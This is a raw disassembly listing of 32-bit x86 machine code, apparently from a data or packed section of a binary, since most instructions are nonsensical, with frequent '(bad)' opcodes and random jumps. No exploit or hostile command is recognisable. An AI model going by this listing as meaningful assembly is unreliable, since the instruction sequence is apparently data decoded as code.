  4095f5:	mov    bh,0x49
  4095f7:	dec    edi
  4095f8:	mov    DWORD PTR [edx+0x3e],0x4a35aa49
  4095ff:	fmul   QWORD PTR [eax-0x4e7160a2]
  409605:	rcl    BYTE PTR [edx+0x77],1
  409608:	sbb    BYTE PTR [ebx+0x3c],al
  40960b:	retf   0x476e
  40960e:	xchg   esp,eax
  40960f:	fs (bad) 
  409611:	pop    esp
  409612:	loop   0x409632
  409614:	adc    DWORD PTR [edi],edx
  409616:	xchg   DWORD PTR [edx-0x85d0e7e],esp
  40961c:	sub    eax,0x712ff865
  409621:	push   esi
  409622:	or     DWORD PTR [eax+esi*8-0x62dedb62],0xffffffb2
  40962a:	inc    ecx
  40962b:	ja     0x4095ea
  40962d:	in     eax,0x74
  40962f:	loop   0x409624
  409631:	pop    edi
  409632:	clc    
  409633:	lods   eax,DWORD PTR ds:[esi]
  409634:	inc    ebx
  409635:	gs icebp 
  409637:	push   edx
  409638:	or     eax,0xb9062c23
  40963d:	(bad)  
  40963e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40963f:	das    
  409640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409641:	xchg   BYTE PTR [edi+ebp*2],bl
  409644:	leave  
  409645:	lods   eax,DWORD PTR ds:[esi]
  409646:	mov    ebp,0x54557a59
  40964b:	ret    
  40964c:	pop    esp
  40964d:	mov    edx,DWORD PTR [eax+0x7c8bde38]
  409653:	rol    BYTE PTR [eax+0x5278eb51],1
  409659:	loopne 0x40965d
  40965b:	repnz fst QWORD PTR [ebx]
  40965e:	xchg   ecx,eax
  40965f:	mov    edi,0xe736a504
  409664:	hlt    
  409665:	pop    ebx
  409666:	dec    esp
  409667:	cmp    BYTE PTR [ebx+0x7d],0x9c
  40966b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40966c:	push   edx
  40966d:	sub    edi,DWORD PTR [edi+0x60]
  409670:	stos   BYTE PTR es:[edi],al
  409671:	or     BYTE PTR [edx-0x7041c0fa],0x2c
  409678:	cmp    al,0x31
  40967a:	imul   eax,esp,0x186352d0
  409680:	mov    ecx,0xf9b006be
  409685:	iret   
  409686:	xor    BYTE PTR [esi],ah
  409688:	add    al,0x25
  40968a:	cmp    DWORD PTR [ecx],ebp
  40968c:	sti    
  40968d:	or     eax,0xaf055511
  409692:	mov    DWORD PTR [ecx-0x12],ecx
  409695:	mov    cl,0xb8
  409697:	sub    ah,BYTE PTR [ebp+ebx*4+0x1919906]
  40969e:	iret   
  40969f:	pop    ebp
  4096a0:	(bad)  
  4096a1:	cmp    DWORD PTR [edi],edx
  4096a3:	mov    esi,0xe0d30cd8
  4096a8:	mov    edi,0xf3155075
  4096ad:	push   ecx
  4096ae:	in     eax,0x86
  4096b0:	and    DWORD PTR [ebx+0x3f],edx
  4096b3:	popf   
  4096b4:	sahf   
  4096b5:	gs xor al,0x39
  4096b8:	aad    0x4d
  4096ba:	sub    eax,ebp
  4096bc:	cmp    al,0x72
  4096be:	in     al,0xa8
  4096c0:	jbe    0x409700
  4096c2:	pop    ss
  4096c3:	ficom  DWORD PTR [ebx-0x74c59fa9]
  4096c9:	gs jp  0x4096d7
  4096cc:	scas   eax,DWORD PTR es:[edi]
  4096cd:	sbb    DWORD PTR [edi+ebp*1-0x2293192a],edi
  4096d4:	cli    
  4096d5:	test   eax,edi
  4096d7:	out    dx,eax
  4096d8:	call   0xe1d0311
  4096dd:	std    
  4096de:	jb     0x4096d3
  4096e0:	sti    
  4096e1:	mov    ds:0xb4414042,eax
  4096e6:	js     0x40973c
  4096e8:	ret    
  4096e9:	cmp    BYTE PTR [ecx-0x3a],bh
  4096ec:	adc    edx,DWORD PTR [esi+0x16]
  4096ef:	lods   eax,DWORD PTR ds:[esi]
  4096f0:	call   0x14535f81
  4096f5:	mov    esp,0x7561cc89
  4096fa:	arpl   si,cx
  4096fc:	stc    
  4096fd:	pop    edx
  4096fe:	bound  ebp,QWORD PTR [esi+0x6ed9bf0e]
  409704:	retf   0x4d1b
  409707:	xor    eax,0x13161880
  40970c:	pop    ebx
  40970d:	or     ebx,DWORD PTR [edi+ebp*1+0x27]
  409711:	jno    0x409694
  409713:	ret    
  409714:	inc    esp
  409715:	pop    ds
  409716:	xor    BYTE PTR fs:[esi],cl
  409719:	dec    ebp
  40971a:	js     0x409716
  40971c:	popf   
  40971d:	jmp    0x5037:0x1782792b
  409724:	inc    esi
  409725:	repz int3 
  409727:	stos   BYTE PTR es:[edi],al
  409728:	jp     0x4096bd
  40972a:	xchg   edi,eax
  40972b:	inc    ecx
  40972c:	mov    edi,0x9617d29f
  409731:	inc    eax
  409732:	dec    esi
  409733:	inc    ebx
  409734:	popa   
  409735:	lods   al,BYTE PTR ds:[esi]
  409736:	dec    esp
  409737:	cmp    al,0xac
  409739:	add    BYTE PTR [ecx-0x4b66bf48],ch
  40973f:	xchg   esp,eax
  409740:	lods   al,BYTE PTR ds:[esi]
  409741:	mov    esp,0xb0bc9957
  409746:	push   ss
  409747:	mov    esp,0xb0bfa7a4
  40974c:	scas   al,BYTE PTR es:[edi]
  40974d:	lds    edx,FWORD PTR [ecx]
  40974f:	retf   0x750c
  409752:	(bad)  
  409753:	jmp    0x4097cc
  409755:	sbb    esi,DWORD PTR [ecx+0x4bbf54d2]
  40975b:	jg     0x4097cb
  40975d:	hlt    
  40975e:	in     al,dx
  40975f:	mov    edi,0x2f5fd448
  409764:	or     al,0xa4
  409766:	jge    0x409736
  409768:	xchg   esi,eax
  409769:	mov    esp,0x69f1eed8
  40976e:	push   0xffffffb3
  409770:	repz xchg edi,eax
  409772:	std    
  409773:	jmp    0x512c:0x39ba375a
  40977a:	pop    es
  40977b:	stc    
  40977c:	xchg   cl,dl
  40977e:	(bad)  
  40977f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409780:	push   eax
  409781:	out    dx,eax
  409782:	add    al,0xd1
  409784:	sbb    eax,0x90ed978b
  409789:	shr    DWORD PTR [esi+0x46207f8b],1
  40978f:	sahf   
  409790:	aaa    
  409791:	sub    DWORD PTR [esi-0x7d909a8],edx
  409797:	int    0xe
  409799:	in     al,0x87
  40979b:	gs mov esp,0x1bf5cb05
  4097a1:	ja     0x40978e
  4097a3:	popa   
  4097a4:	mov    eax,0x46ec252f
  4097a9:	les    esi,FWORD PTR [ecx+0x9831758]
  4097af:	jg     0x4097fc
  4097b1:	retf   0x8960
  4097b4:	std    
  4097b5:	mov    ebp,DWORD PTR [ebx+0x14]
  4097b8:	pop    edx
  4097b9:	sbb    edi,DWORD PTR [esi+0x7e861ff4]
  4097bf:	jb     0x4097fc
  4097c1:	adc    dh,BYTE PTR [esp+ebx*8+0x145f1ef4]
  4097c8:	push   edx
  4097c9:	and    DWORD PTR [ebp-0x47],esp
  4097cc:	and    BYTE PTR ds:[edi],bl
  4097cf:	jecxz  0x4097ef
  4097d1:	mov    ds:0xebf60165,al
  4097d6:	arpl   WORD PTR [ecx+0x35],si
  4097d9:	xor    al,0x7f
  4097db:	retf   0x1b06
  4097de:	xchg   esi,eax
  4097df:	mov    esp,0x1f07be04
  4097e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097e5:	mov    eax,0xc52afa4
  4097ea:	(bad)  
  4097eb:	je     0x409868
  4097ed:	jl     0x4097ab
  4097ef:	call   0x49e65e65
  4097f4:	inc    esi
  4097f5:	fisubr DWORD PTR [edx+0x2a838a07]
  4097fb:	das    
  4097fc:	adc    dl,BYTE PTR [eax+ecx*8-0x3398c165]
  409803:	xchg   ecx,eax
  409804:	jnp    0x409845
  409806:	and    al,0xb4
  409808:	fsub   DWORD PTR [edi]
  40980a:	or     DWORD PTR [ebx+0x49],ecx
  40980d:	dec    esi
  40980e:	js     0x4097a0
  409810:	(bad)  
  409811:	mov    esi,0x72f9e97e
  409816:	int3   
  409817:	lds    esi,FWORD PTR [esi-0x5d2c1ede]
  40981d:	hlt    
  40981e:	neg    BYTE PTR ds:0xf97aa9ca
  409824:	icebp  
  409825:	stc    
  409826:	lods   al,BYTE PTR ds:[esi]
  409827:	inc    edx
  409828:	int3   
  409829:	and    eax,eax
  40982b:	icebp  
  40982c:	ret    
  40982d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40982e:	shl    DWORD PTR [edx+0x509039ca],0xb0
  409835:	cwde   
  409836:	pop    ecx
  409837:	scas   eax,DWORD PTR es:[edi]
  409838:	imul   esi,edx,0xffffffdb
  40983b:	add    edx,edi
  40983d:	mov    esp,0x3f88dbb7
  409842:	fs aas 
  409844:	sar    BYTE PTR ss:[ecx+edi*4-0x6f],0x2f
  40984a:	mov    eax,0x1d3b16b0
  40984f:	shl    DWORD PTR [ecx],1
  409851:	xchg   dl,dh
  409853:	cmp    DWORD PTR [esi+0x42f4a490],esi
  409859:	and    BYTE PTR [ebx+eiz*2+0x4e89788d],0xf
  409861:	pop    ebp
  409862:	jle    0x4098d0
  409864:	push   edx
  409865:	or     DWORD PTR ds:0xdacef80c,esi
  40986b:	add    DWORD PTR [ebx-0x21],0x4d
  40986f:	and    bh,BYTE PTR [esi+0x3d]
  409872:	aas    
  409873:	inc    ebp
  409874:	call   0xb7f6:0x74db5e89
  40987b:	outs   dx,BYTE PTR ds:[esi]
  40987c:	mov    BYTE PTR [esi+0x66],0xcf
  409880:	outs   dx,BYTE PTR ds:[esi]
  409881:	mov    bh,0xa4
  409883:	outs   dx,DWORD PTR ds:[esi]
  409884:	lods   al,BYTE PTR ds:[esi]
  409885:	jbe    0x4098df
  409887:	(bad)  
  409888:	aaa    
  409889:	or     al,0xca
  40988b:	cld    
  40988c:	ja     0x409823
  40988e:	ret    0x29be
  409891:	dec    edx
  409892:	mov    ds:0x34faec78,eax
  409897:	xor    esp,DWORD PTR [edi-0xf30128b]
  40989d:	cmp    DWORD PTR [eax+eax*1-0x1f550d4],esp
  4098a4:	mov    ds:0x843ce033,al
  4098a9:	cli    
  4098aa:	shl    DWORD PTR [esi+0x1eebaa42],cl
  4098b0:	or     ah,ah
  4098b2:	or     DWORD PTR [eax+edi*8+0x50d2a34e],eax
  4098b9:	dec    eax
  4098ba:	adc    al,0x39
  4098bc:	sti    
  4098bd:	(bad)  
  4098be:	repnz sbb BYTE PTR [ebp+0x71bb8a08],0x7d
  4098c6:	ja     0x409877
  4098c8:	or     esi,esi
  4098ca:	dec    esp
  4098cb:	push   esp
  4098cc:	fdiv   DWORD PTR [ecx]
  4098ce:	pop    ebx
  4098cf:	outs   dx,DWORD PTR ds:[esi]
  4098d0:	and    al,0x20
  4098d2:	(bad)  [eax]
  4098d4:	mov    ds:0xd08ba026,al
  4098d9:	jbe    0x409881
  4098db:	mov    dl,0xde
  4098dd:	jnp    0x4098dc
  4098df:	mov    dh,ch
  4098e1:	xor    esi,DWORD PTR [eax]
  4098e3:	inc    ecx
  4098e4:	pop    ebx
  4098e5:	pop    ebx
  4098e6:	and    edx,DWORD PTR [eax-0xf]
  4098e9:	or     eax,0xe8703384
  4098ee:	pop    esp
  4098ef:	dec    ebp
  4098f0:	ins    BYTE PTR es:[edi],dx
  4098f1:	test   al,0xf3
  4098f3:	inc    esp
  4098f4:	test   eax,0xa61a2db8
  4098f9:	pop    esi
  4098fa:	out    0xb7,al
  4098fc:	push   ebp
  4098fd:	mov    ecx,0x2a9baf7e
  409902:	add    eax,DWORD PTR [ebx]
  409904:	jecxz  0x4098e7
  409906:	xchg   edi,eax
  409907:	pop    esi
  409908:	xchg   esi,eax
  409909:	pop    esi
  40990a:	std    
  40990b:	or     al,0xbd
  40990d:	xchg   ebp,eax
  40990e:	jnp    0x40995b
  409910:	push   es
  409911:	mov    esp,0x18872a7
  409916:	jmp    0x4098bd
  409918:	xor    al,0x90
  40991a:	pop    ebx
  40991b:	aad    0x95
  40991d:	mov    dl,BYTE PTR es:[esi+0x400a6623]
  409924:	retf   
  409925:	call   0xaff8524c
  40992a:	popf   
  40992b:	cwde   
  40992c:	push   0x5202a0b9
  409931:	bound  eax,QWORD PTR [eax+eiz*4+0x1aad383]
  409938:	out    dx,eax
  409939:	sub    al,0xc2
  40993b:	js     0x4099b1
  40993d:	mov    ebx,0xdb042e44
  409942:	stos   DWORD PTR es:[edi],eax
  409943:	xor    ecx,DWORD PTR [esi-0x19]
  409946:	cmp    esi,DWORD PTR [ecx+0x63]
  409949:	nop
  40994a:	js     0x409949
  40994c:	jb     0x4099a1
  40994e:	lods   al,BYTE PTR ds:[esi]
  40994f:	stos   DWORD PTR es:[edi],eax
  409950:	out    dx,eax
  409951:	and    al,bh
  409953:	fisttp QWORD PTR [edx]
  409955:	adc    ah,BYTE PTR [edi]
  409957:	dec    edi
  409958:	xchg   ebp,eax
  409959:	pushf  
  40995a:	xor    esp,eax
  40995c:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40995e:	sbb    eax,0x57010678
  409963:	inc    ebp
  409964:	loop   0x409940
  409966:	repnz fucomip st,st(2)
  409969:	retf   0x5f7f
  40996c:	out    dx,al
  40996d:	icebp  
  40996e:	cdq    
  40996f:	push   ss
  409970:	call   0x814e:0xd8311b16
  409977:	xchg   ebx,eax
  409978:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409979:	sbb    bl,BYTE PTR [ecx]
  40997b:	loop   0x4099d1
  40997d:	mov    WORD PTR [eax-0x52e14f8e],gs
  409983:	dec    ecx
  409984:	call   FWORD PTR [ecx]
  409986:	or     ebp,DWORD PTR [eax]
  409988:	loope  0x4099b4
  40998a:	outs   dx,BYTE PTR ds:[esi]
  40998b:	sbb    BYTE PTR [ecx+edi*4+0x2e],cl
  40998f:	(bad)  
  409990:	aad    0xce
  409992:	dec    esp
  409993:	cdq    
  409994:	mov    bh,0x83
  409996:	scas   eax,DWORD PTR es:[edi]
  409997:	test   al,0x3
  409999:	aaa    
  40999a:	fdivrp st(2),st
  40999c:	xor    DWORD PTR [ebp+0x34f5deca],ecx
  4099a2:	pop    ebx
  4099a3:	int    0x98
  4099a5:	(bad)  
  4099a6:	adc    BYTE PTR [edx-0x3],bh
  4099a9:	ror    BYTE PTR [edi+0x5d40c215],0x19
  4099b0:	in     eax,0x64
  4099b2:	(bad)  
  4099b3:	arpl   dx,bx
  4099b5:	sub    al,0x38
  4099b7:	inc    edx
  4099b8:	je     0x4099e5
  4099ba:	mov    ebp,0xaefee244
  4099bf:	jge    0x409a02
  4099c1:	arpl   sp,cx
  4099c3:	add    DWORD PTR [esi+esi*8],0x320942dd
  4099ca:	sbb    DWORD PTR [ebp+0x5111bfde],ebx
  4099d0:	test   BYTE PTR [ecx+ebp*4+0x11],dh
  4099d4:	test   DWORD PTR [edi-0x4fac8fdb],eax
  4099da:	sub    eax,0x3da6129c
  4099df:	pop    eax
  4099e0:	mov    edi,ecx
  4099e2:	ret    
  4099e3:	rcr    DWORD PTR [ecx],cl
  4099e5:	lahf   
  4099e6:	stc    
  4099e7:	test   BYTE PTR [ebx-0x65],0xc9
  4099eb:	imul   esp,DWORD PTR [edx],0x37
  4099ee:	inc    ecx
  4099ef:	fstp   TBYTE PTR [ecx+0x28c96164]
  4099f5:	mov    eax,ds:0x88f950e8
  4099fa:	imul   DWORD PTR [ecx+edi*8-0x43]
  4099fe:	test   BYTE PTR [esi-0x770dd488],bh
  409a04:	xchg   esp,eax
  409a05:	call   DWORD PTR [edi+0xf]
  409a08:	xchg   edi,eax
  409a09:	inc    ebx
  409a0a:	daa    
  409a0b:	mov    ebx,0xe8007bfa
  409a10:	addps  xmm1,xmm6
  409a13:	xchg   ebp,eax
  409a14:	xchg   esi,eax
  409a15:	mov    cs,WORD PTR [edx]
  409a17:	loope  0x409a46
  409a19:	lock mov eax,DWORD PTR [ecx+0x3da35611]
  409a20:	leave  
  409a21:	retf   
  409a22:	nop
  409a23:	cld    
  409a24:	inc    esi
  409a25:	nop    edx
  409a28:	push   esp
  409a29:	inc    edx
  409a2a:	sbb    BYTE PTR [eax-0xe],0xb0
  409a2e:	push   0x25
  409a30:	lds    eax,FWORD PTR [eax+0x5280851c]
  409a36:	arpl   WORD PTR [esi],bx
  409a38:	pop    esi
  409a39:	or     al,0xa8
  409a3b:	bound  esi,QWORD PTR [edi+0x5]
  409a3e:	retf   
  409a3f:	and    cl,BYTE PTR [edx+0x19cd9eb9]
  409a45:	adc    dh,cl
  409a47:	mov    al,0xce
  409a49:	clc    
  409a4a:	or     ebx,edi
  409a4c:	push   0x6b
  409a4e:	loop   0x4099d5
  409a50:	leave  
  409a51:	push   0x5c9df17a
  409a56:	xor    cl,dh
  409a58:	mov    ebp,0x837a606f
  409a5d:	mov    WORD PTR [edi+0x4f],fs
  409a60:	mov    eax,0xf5fddf23
  409a65:	in     al,0x70
  409a67:	push   esi
  409a68:	jae    0x4099fa
  409a6a:	xchg   edx,eax
  409a6b:	ds pushf 
  409a6d:	or     eax,0xa45dab19
  409a72:	jg     0x409a78
  409a74:	and    cl,BYTE PTR [edx-0x2c]
  409a77:	arpl   cx,ax
  409a79:	ss fadd st,st(6)
  409a7c:	gs or  eax,0x9465f50e
  409a82:	lds    edx,FWORD PTR [esi+0x35cd14d8]
  409a88:	daa    
  409a89:	(bad)  
  409a8a:	jp     0x409a79
  409a8c:	sbb    DWORD PTR [ecx],eax
  409a8e:	ficom  DWORD PTR [edi]
  409a90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a91:	adc    DWORD PTR [edx+0x31],eax
  409a94:	mov    ebx,0x66f91c58
  409a99:	sbb    edx,DWORD PTR [eax]
  409a9b:	push   ebp
  409a9c:	cmp    ecx,esp
  409a9e:	sub    eax,0xd21810d8
  409aa3:	ds pop edx
  409aa5:	pop    ebp
  409aa6:	sar    DWORD PTR gs:[esi+0x9eebee3],0x15
  409aae:	pop    es
  409aaf:	push   eax
  409ab0:	cmp    BYTE PTR [eax+0x6d],ch
  409ab3:	mov    ebp,0xb2c4ead9
  409ab8:	xchg   esp,eax
  409ab9:	mov    cl,0x13
  409abb:	mov    ds:0x51f45d40,eax
  409ac1:	xor    al,0xee
  409ac3:	stc    
  409ac4:	cs xchg ebp,eax
  409ac6:	push   ds
  409ac7:	inc    dh
  409ac9:	enter  0x8661,0x95
  409acd:	pusha  
  409ace:	clc    
  409acf:	jge    0x409a98
  409ad1:	mov    bl,0x5c
  409ad3:	ins    DWORD PTR es:[edi],dx
  409ad4:	leave  
  409ad5:	sbb    esi,DWORD PTR [ecx]
  409ad7:	cld    
  409ad8:	pop    es
  409ad9:	ins    DWORD PTR es:[edi],dx
  409ada:	retf   
  409adb:	dec    ecx
  409adc:	jmp    0x9a1b:0xb0f8ae1
  409ae3:	jbe    0x409b43
  409ae5:	sub    cl,cl
  409ae7:	mov    bh,0xfb
  409ae9:	retf   
  409aea:	out    0x5d,al
  409aec:	jge    0x409b0d
  409aee:	pop    ds
  409aef:	dec    esi
  409af0:	mov    cl,BYTE PTR [ebp+ebx*8+0x36e3f573]
  409af7:	aam    0x22
  409af9:	pop    esp
  409afa:	mov    ecx,0x71f9a2b2
  409aff:	adc    al,0xd4
  409b01:	jmp    0x409ae4
  409b03:	ins    DWORD PTR es:[edi],dx
  409b04:	ret    
  409b05:	mov    dl,0xf6
  409b07:	jno    0x409aba
  409b09:	(bad)  
  409b0a:	jmp    FWORD PTR [esi+0x381bed29]
  409b10:	(bad)  
  409b11:	and    ebp,ecx
  409b13:	inc    esp
  409b14:	mov    edi,?
  409b16:	jl     0x409b59
  409b18:	mov    eax,DWORD PTR [ebx+0x6130e15f]
  409b1e:	adc    bl,BYTE PTR ds:0x5ff6a3de
  409b24:	sub    al,cl
  409b26:	jg     0x409adf
  409b28:	xor    eax,0xe7a13871
  409b2d:	pusha  
  409b2e:	fist   WORD PTR [ebx]
  409b30:	mov    esi,0x6600ca36
  409b35:	enter  0xfdc2,0xbd
  409b39:	popf   
  409b3a:	pop    ss
  409b3b:	adc    al,0xc6
  409b3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b3e:	or     al,0x5f
  409b40:	test   eax,0x67298538
  409b45:	cmp    dh,0x47
  409b48:	cdq    
  409b49:	dec    esp
  409b4a:	lods   al,BYTE PTR ds:[esi]
  409b4b:	push   eax
  409b4c:	int3   
  409b4d:	ins    BYTE PTR es:[edi],dx
  409b4e:	sbb    eax,0x7c5518f4
  409b53:	jmp    0xf5f6:0x4558faa8
  409b5a:	xchg   ebp,eax
  409b5b:	mov    ds:0x2f111594,eax
  409b60:	and    BYTE PTR [eax+0x4a],0xbf
  409b64:	pop    ebp
  409b65:	and    al,0xb
  409b67:	push   eax
  409b68:	sbb    DWORD PTR [eax+0x661c2c4d],ebx
  409b6e:	imul   edx,DWORD PTR [eax+0x3777c2ad],0x102dbf91
  409b78:	or     dh,dl
  409b7a:	leave  
  409b7b:	aam    0x29
  409b7d:	cmp    esi,DWORD PTR [edx]
  409b7f:	and    esp,DWORD PTR [eax]
  409b81:	adc    al,0xa2
  409b83:	jb     0x409b3e
  409b85:	mov    bh,0xfa
  409b87:	adc    eax,0x9616cb88
  409b8c:	rol    BYTE PTR [ecx],1
  409b8e:	fnstenv [ebx-0x4f]
  409b91:	adc    eax,0xb985ce0f
  409b96:	cmp    ch,BYTE PTR [edx+0x77f6a58a]
  409b9c:	xor    DWORD PTR ds:[edi+0x7c],ebx
  409ba0:	lahf   
  409ba1:	(bad)  
  409ba2:	dec    esp
  409ba3:	xor    DWORD PTR [edx],0xffffffde
  409ba6:	outs   dx,BYTE PTR ds:[esi]
  409ba7:	mov    eax,es:0xbbb22b33
  409bad:	aas    
  409bae:	out    dx,al
  409baf:	xor    BYTE PTR ds:0x340de908,al
  409bb5:	xchg   DWORD PTR [ebx],edi
  409bb7:	retf   0xf955
  409bba:	fdivr  DWORD PTR [eax+0x862fe0f]
  409bc0:	test   BYTE PTR [esi+ebx*1-0x39],bl
  409bc4:	sbb    DWORD PTR [esi+0x784386d3],ebp
  409bca:	sahf   
  409bcb:	jne    0x409b6c
  409bcd:	inc    esi
  409bce:	and    al,0xb3
  409bd0:	out    0xea,al
  409bd2:	push   ebx
  409bd3:	add    eax,0x1ab10c50
  409bd8:	adc    DWORD PTR [esp+edi*2-0x5a],edi
  409bdc:	repnz cmp BYTE PTR gs:[esi],bl
  409be0:	push   ss
  409be1:	jmp    0x409ba5
  409be3:	push   ebx
  409be4:	call   ebp
  409be6:	xchg   ebx,eax
  409be7:	push   eax
  409be8:	xchg   edx,eax
  409be9:	(bad)  
  409bea:	data16 mov bh,0x23
  409bed:	jg     0x409c00
  409bef:	mov    ecx,0x537cdfbb
  409bf4:	test   BYTE PTR [eax+esi*2],al
  409bf7:	sub    DWORD PTR [esi],edi
  409bf9:	jmp    0x409baf
  409bfb:	push   eax
  409bfc:	aaa    
  409bfd:	adc    BYTE PTR [ebx*8+0xef042e5],0x26
  409c05:	cwde   
  409c06:	xor    DWORD PTR [esi+0x98d83b8],ebx
  409c0c:	ds jmp 0x409bda
  409c0f:	or     edx,DWORD PTR [esi+0x630c2dd2]
  409c15:	jnp    0x409c00
  409c17:	cmp    BYTE PTR [edi],0xc9
  409c1a:	(bad)  
  409c1b:	stc    
  409c1c:	add    dh,BYTE PTR [eax-0x2b6d57d6]
  409c22:	clc    
  409c23:	and    ebx,edx
  409c25:	mov    eax,0xd3425da2
  409c2a:	call   0xc699e49c
  409c2f:	fimul  WORD PTR [ebx+0x5c6a3321]
  409c35:	xor    eax,esp
  409c37:	xlat   BYTE PTR ds:[ebx]
  409c38:	test   BYTE PTR [ecx+ebp*8-0x19cc38ed],dh
  409c3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c40:	sub    cl,0xd3
  409c43:	dec    ebp
  409c44:	(bad)  
  409c45:	ins    BYTE PTR es:[edi],dx
  409c46:	add    eax,0x4e54c617
  409c4b:	mov    esi,0xc82ffc32
  409c50:	jecxz  0x409c68
  409c52:	and    al,BYTE PTR [esi-0x5a0d476]
  409c58:	(bad)  
  409c59:	pop    ds
  409c5a:	repz imul esp,DWORD PTR es:[ecx+0x5b08e357],0x25ccdb34
  409c66:	sbb    ebx,esi
  409c68:	shr    bl,0xb0
  409c6b:	les    ecx,FWORD PTR [ebp-0x165ad1cc]
  409c71:	fwait
  409c72:	rcr    bh,0x80
  409c75:	dec    DWORD PTR [ecx+0x20ef52ae]
  409c7b:	retf   
  409c7c:	or     ch,BYTE PTR [edx-0x6]
  409c7f:	dec    esi
  409c80:	jge    0x409c35
  409c82:	fisttp QWORD PTR [edi]
  409c84:	mov    ecx,0xa58fa582
  409c89:	xchg   BYTE PTR [esi+0x4],dl
  409c8c:	add    eax,0x8f780d91
  409c91:	mov    eax,ds:0x26fa55fc
  409c96:	out    0x0,eax
	...
  409d14:	adc    ecx,DWORD PTR ds:0xf7be76a8
  409d1a:	fild   QWORD PTR [ebp-0x8]
  409d1d:	out    0xa8,al
  409d1f:	pause  
  409d21:	cdq    
  409d22:	xor    BYTE PTR [edi],ch
  409d24:	call   0x6b409d78
  409d29:	pop    es
  409d2a:	add    BYTE PTR [eax],al
  409d2c:	dec    ecx
  409d2d:	hlt    
  409d2e:	sbb    BYTE PTR [edi+0x1fdc131b],0x35
  409d35:	or     DWORD PTR [ebp+0xf],0xffffffb4
  409d39:	lahf   
  409d3a:	push   edi
  409d3b:	loopne 0x409d55
  409d3d:	stos   WORD PTR es:[edi],ax
  409d3f:	adc    BYTE PTR [ebp-0x202916cc],dl
  409d45:	gs xchg edx,eax
  409d47:	(bad)  
  409d48:	ror    BYTE PTR [edi+0x66],1
  409d4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d4c:	outs   dx,BYTE PTR ds:[esi]
  409d4d:	inc    ebp
  409d4e:	adc    eax,0xe7fe6d17
  409d53:	mov    ch,0x64
  409d55:	aas    
  409d56:	jl     0x409d56
  409d58:	test   eax,0x815f5086
  409d5d:	out    dx,eax
  409d5e:	xor    BYTE PTR [ebp+0x6a92bcb2],bh
  409d64:	(bad)  
  409d65:	dec    eax
  409d66:	ret    
  409d67:	ja     0x409d7b
  409d69:	ror    DWORD PTR [ebp-0x16],0xbf
  409d6d:	adc    BYTE PTR [ecx+0x257ec0f4],cl
  409d73:	add    ah,BYTE PTR [edx]
  409d75:	and    ecx,edx
  409d77:	push   edx
  409d78:	arpl   ax,dx
  409d7a:	pop    eax
  409d7b:	das    
  409d7c:	mov    dh,0x14
  409d7e:	add    edx,DWORD PTR [esp+ebx*2]
  409d81:	les    esp,FWORD PTR [edx+edx*4-0x6]
  409d85:	data16 mov dh,0x41
  409d88:	xor    eax,0xb8df48c1
  409d8d:	pop    ebx
  409d8e:	fsubp  st(4),st
  409d90:	test   ebp,ecx
  409d92:	dec    eax
  409d93:	fisttp DWORD PTR [ecx+ecx*1]
  409d96:	and    ebp,DWORD PTR [edx]
  409d98:	dec    ebp
  409d99:	mov    cl,0xb3
  409d9b:	repnz (bad) 
  409d9e:	(bad)  
  409d9f:	mov    ?,WORD PTR [edi+eax*1]
  409da2:	push   DWORD PTR [ebx]
  409da4:	int3   
  409da5:	imul   esp,DWORD PTR [ecx-0x46b1b8a4],0xffffffdd
  409dac:	shl    BYTE PTR [ebx-0x7923e2a3],0x71
  409db3:	and    al,0x4b
  409db5:	xor    al,0xb5
  409db7:	cli    
  409db8:	xchg   edi,eax
  409db9:	test   BYTE PTR [esi],bl
  409dbb:	adc    eax,DWORD PTR [eax]
  409dbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409dbe:	loope  0x409e01
  409dc0:	cld    
  409dc1:	cmp    DWORD PTR [ecx+esi*8],eax
  409dc4:	movq   mm6,mm2
  409dc7:	push   ebx
  409dc8:	(bad)  
  409dc9:	je     0x409e3e
  409dcb:	rol    DWORD PTR [edi],1
  409dcd:	(bad)  
  409dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dcf:	out    dx,al
  409dd0:	xchg   eax,ebx
  409dd2:	daa    
  409dd3:	(bad)  
  409dd4:	mov    ebx,0xabd5692a
  409dd9:	sti    
  409dda:	xchg   ecx,eax
  409ddb:	ret    0x29bf
  409dde:	fsubrp st(0),st
  409de0:	adc    DWORD PTR [ebx-0x97f6100],0x2
  409de7:	out    dx,eax
  409de8:	sbb    al,0x6f
  409dea:	fisub  WORD PTR [edx+ebp*1+0x49]
  409dee:	sti    
  409def:	pop    ds
  409df0:	xchg   ebx,eax
  409df1:	out    0xd5,eax
  409df3:	cdq    
  409df4:	fidivr DWORD PTR [eax+0xde6f92c]
  409dfa:	pushf  
  409dfb:	ror    edx,cl
  409dfd:	stc    
  409dfe:	sbb    bh,BYTE PTR [esi+ebx*4+0x6e]
  409e02:	add    DWORD PTR [ebp+0x30],0x5117089a
  409e09:	adc    DWORD PTR [ebp+0x49],ecx
  409e0c:	fwait
  409e0d:	xor    bh,BYTE PTR [esi]
  409e0f:	xor    al,0x61
  409e11:	dec    ebp
  409e12:	sub    eax,0x106b5ee3
  409e17:	hlt    
  409e18:	mov    al,ds:0x4766de75
  409e1d:	retf   
  409e1e:	pushf  
  409e1f:	sub    DWORD PTR [ecx-0x1856fe2],edi
  409e25:	inc    esp
  409e26:	retf   
  409e27:	retf   0xcbd4
  409e2a:	and    BYTE PTR [ebx+0x2a],dh
  409e2d:	mov    ah,0x8e
  409e2f:	xchg   BYTE PTR [edx+0x48],dh
  409e32:	adc    eax,DWORD PTR [ecx]
  409e34:	sbb    BYTE PTR [eax+eiz*4-0x191d3567],bl
  409e3b:	fst    QWORD PTR [esi-0x19]
  409e3e:	pusha  
  409e3f:	mov    eax,ds:0x3f4a630c
  409e44:	addr16 dec eax
  409e46:	mov    esp,0x4d98717b
  409e4b:	pop    es
